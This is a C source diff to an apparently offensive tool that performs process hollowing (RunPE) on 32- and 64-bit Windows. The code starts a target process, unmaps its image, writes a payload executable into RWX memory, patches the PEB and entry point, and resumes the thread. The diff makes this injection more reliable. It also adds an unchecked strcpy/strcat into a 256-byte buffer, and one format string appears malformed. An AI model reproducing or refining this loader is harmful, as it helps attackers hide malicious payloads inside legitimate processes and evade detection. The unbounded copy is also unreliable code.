@@ -156,15 +156,20 @@ int main (int argc, char **argv)
 		// Instanciate target process
 		// Target process specified in first bfg argument argv[1]	
 		// Command line arguments for payload in second bfg argument argv[2]
+		char commandLine [256];
+		strcpy(commandLine, argv[1]);
+	
 		if(!argv[2]) 
 		{
 			// Handle empty command line arguments for payload executable
 			// Relevant if user does not specify "" as second bfg argument
-			newRunPE(argv[1], payload, "");
+			newRunPE(argv[1], payload, commandLine);
 		} else
 		{
 			// Instanciate and pass command line arguments
-			newRunPE(argv[1], payload, argv[2]);
+			strcat(commandLine, " ");
+			strcat(commandLine, argv[2]);
+			newRunPE(argv[1], payload, commandLine);
 		}	
 	#endif
 
@@ -390,6 +395,7 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 		targetContext->ContextFlags = CONTEXT_FULL;
 		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
 			printf("GetThreadContext for target process main thread failed.\n");
+			return;
 		} else {
 			printf("Retrieved target main thread context.\n");
 		}	
@@ -403,37 +409,56 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 
 		// Get target process image base
 		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Ebx + 8), (LPVOID) (&targetImageBase), sizeof(DWORD), NULL);	
-		printf("Old target process image base is 0x%08X\n", targetImageBase);	
+		printf("Old target process image base is 0x%lX\n", targetImageBase);	
+		printf("Desired new image base of payload is 0x%lX\n", payloadNtHeader->OptionalHeader.ImageBase);
 
 		// Unmap old target process image
 		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
 		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
 		printf("Unmapped old target process image.\n");
-
-		// Allocate new memory in target process
-		targetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+				
+		// Allocate new memory in target process		
+		targetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		if(targetImageBase == 0) {
 			printf("Failed to allocate new memory in target process.\n");
 			printf("Error code is 0x%x\n", GetLastError());
 			return;
 		} else {
-			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
+			printf("Allocated new memory in target process at 0x%lX. This is the new image base.\n", targetImageBase);
+			printf("Allocated 0x%lX bytes, which is the payload image size.\n", payloadNtHeader->OptionalHeader.SizeOfImage);
 		}
 
 		// Write payload headers and sections into target memory
-		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
-		printf("Wrote payload headers to target process.\n");
+		if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL) == 0) {
+			printf("Failed to write payload headers to target process.\n");
+			return;
+		} else {
+			printf("Wrote payload headers to target process.\n");
+		}
 
 		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
 			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
-			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+			if(payloadSectionHeader->SizeOfRawData == 0) {
+				printf("Skipped writing section %d to memory because it's raw size is 0.\n", i);
+			} else {
+				if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL) == 0) {
+					printf("Failed to write section %d to target process.\n", i);
+					printf("Error code is %x\n", GetLastError());
+					return;
+				} else {
+					printf("Wrote section %d to target process, section start address is 0x%lX\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+				}
+			}
 		}
 
 		// Write new target image base into target PEB
-		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Ebx + 8), (LPCVOID) &targetImageBase, sizeof(DWORD), NULL);
-		printf("Fixed target image base to 0x%08x\n", targetImageBase);
+		if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Ebx + 8), (LPCVOID) &targetImageBase, sizeof(DWORD), NULL) == 0) {
+			printf("Failed to fix target image base.\n");
+			return;
+		} else { 
+			printf("Fixed target image base to 0x%lx\n", targetImageBase);
+		}
 
 		// Modify entry point to execute the copied payload
 		targetContext->Eax = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
@@ -447,6 +472,7 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 		// Resume target main threads
 		if(ResumeThread(targetProcessInfo.hThread) == -1) {
 			printf("Failed to resume target main thread.\n");
+			return;
 		} else {
 			printf("Resumed target main thread.\n");
 		}
@@ -460,7 +486,7 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 		PIMAGE_NT_HEADERS payloadNtHeader;
 		PIMAGE_SECTION_HEADER payloadSectionHeader;
 		DWORD64 targetImageBase;
-		PCONTEXT targetContext;
+		PCONTEXT targetContext;		
 
 		// Init info structures for target process instanciation
 		RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
@@ -485,51 +511,69 @@ void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 		targetContext->ContextFlags = CONTEXT_FULL;
 		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
 			printf("GetThreadContext for target process main thread failed.\n");
+			return;
 		} else {
 			printf("Retrieved target main thread context.\n");
 		}	
 
 		// Get payload headers
 		payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
-		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
+		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);		
 
 		// Patch payload subsystem to avoid crashes
 		payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
 
 		// Get target process image base
 		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Rdx + 16), (LPVOID) (&targetImageBase), sizeof(PVOID), NULL);		
-		printf("Desired image base is:   0x%16X\n", payloadNtHeader->OptionalHeader.ImageBase);	
-		printf("Actual target process image base is 0x%08X\n", targetImageBase);	
+		printf("Actual target process image base is 0x%llX\n", targetImageBase);	
+		printf("Desired new image base of payload is 0x%llX\n", payloadNtHeader->OptionalHeader.ImageBase);
 
 		// Unmap old target process image
 		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
 		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
 		printf("Unmapped old target process image.\n");
-
-		// Allocate new memory in target process
-		targetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		
+		// Allocate new memory in target process	
+		targetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		if(targetImageBase == 0) {
 			printf("Failed to allocate new memory in target process.\n");
 			printf("Error code is 0x%x\n", GetLastError());
 			return;
 		} else {
-			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
+			printf("Allocated new memory in target process at 0x%llX. This is the new image base.\n", targetImageBase);
+			printf("Allocated %0xlX bytes, which is the payload image size.\n", payloadNtHeader->OptionalHeader.SizeOfImage);
 		}
 
 		// Write payload headers and sections into target memory
-		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
-		printf("Wrote payload headers to target process.\n");
+		if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL) == 0) {
+			printf("Failed to write payload headers to target process.\n");
+			return;
+		} else {
+			printf("Wrote payload headers to target process.\n");
+		}
 
 		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
 			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
-			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+			if(payloadSectionHeader->SizeOfRawData == 0) {
+				printf("Skipped writing section %d to memory because it's raw size is 0.\n", i);
+			} else {
+				if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL) == 0) {
+					printf("Failed to write section %d to target process.\n", i);
+					return;
+				} else {
+					printf("Wrote section %d to target process, section start address is 0x%llX\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+				}
+			}
 		}
 
 		// Write new target image base into target PEB
-		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Rdx + 16), (LPCVOID) &targetImageBase, sizeof(PVOID), NULL);
-		printf("Fixed target image base to 0x%08x\n", targetImageBase);
+		if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Rdx + 16), (LPCVOID) &targetImageBase, sizeof(PVOID), NULL) == 0) {
+			printf("Failed to fix target image base.\n");
+			return;
+		} else {
+			printf("Fixed target image base to 0x%llx\n", targetImageBase);
+		}
 
 		// Modify entry point to execute the copied payload
 		targetContext->Rcx = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
